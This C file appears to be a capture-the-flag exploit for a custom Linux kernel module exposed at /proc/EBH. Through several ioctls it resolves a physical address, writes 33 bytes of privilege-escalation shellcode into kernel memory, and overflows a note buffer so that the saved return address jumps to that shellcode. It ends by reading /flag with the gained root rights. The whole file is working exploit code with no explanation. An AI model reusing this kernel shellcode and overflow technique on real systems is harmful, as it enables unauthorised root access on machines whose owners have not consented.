#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>


#define GET_PHYSICAL 0x4700
#define PEEK_PHYSICAL 0x5000
#define WRITE_TO_ADDRESS 0x5700
#define WRITE_NOTE 0x5701


struct PeekPhysicalData {
    void *phyaddr;
    unsigned long peeksize;
    void *peekdata;
};

struct WriteToAddrData {
    void *target;
    void *src;
    unsigned long size;
};

struct WriteNoteData {
    void *src;
    unsigned long size;
};


int main() {
    printf("ID : %d\n", getuid());


    int fd = open("/proc/EBH", O_RDONLY);

    unsigned long long shellcode_exec_addr = 0xffffffff81000000;
    unsigned long long shellcode_write_addr = 0xffffc90000045000;
    unsigned long long addr = shellcode_exec_addr;


    ioctl(fd, GET_PHYSICAL, &addr);
    printf("GET PHYSICAL : %llx\n", shellcode_exec_addr);


    char buf[0x68];
    struct PeekPhysicalData peekphysicaldata = {
        .phyaddr = addr, 
        .peeksize = 8, 
        .peekdata = buf
    };
    ioctl(fd, PEEK_PHYSICAL, &peekphysicaldata);
    printf("ioremap : %llx -> %llx\n", shellcode_exec_addr, shellcode_write_addr);


    printf("WRITE SHELLCODE\n");
    char shellcode[33] = {0x48, 0x31, 0xff, 0x48, 0xc7, 0xc2, 0xe0, 0x95, 0x8, 0x81, 0xff, 0xd2, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xc0, 0x92, 0x8, 0x81, 0xff, 0xd2, 0x48, 0xc7, 0xc2, 0x7e, 0x2, 0x0, 0xc0, 0xff, 0xe2};
    struct WriteToAddrData writetoaddrdata = {
        .target = shellcode_write_addr, 
        .src = shellcode, 
        .size = 33
    };
    ioctl(fd, WRITE_TO_ADDRESS, &writetoaddrdata);


    strcpy(buf, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    *(unsigned long long *)(buf + 0x60) = shellcode_exec_addr;
    struct WriteNoteData writenotedata = {
        .src = buf, 
        .size = 0x68
    };
    ioctl(fd, WRITE_NOTE, &writenotedata);

    printf("ID : %d\n", getuid());
    system("cat /flag");

    return 0;
}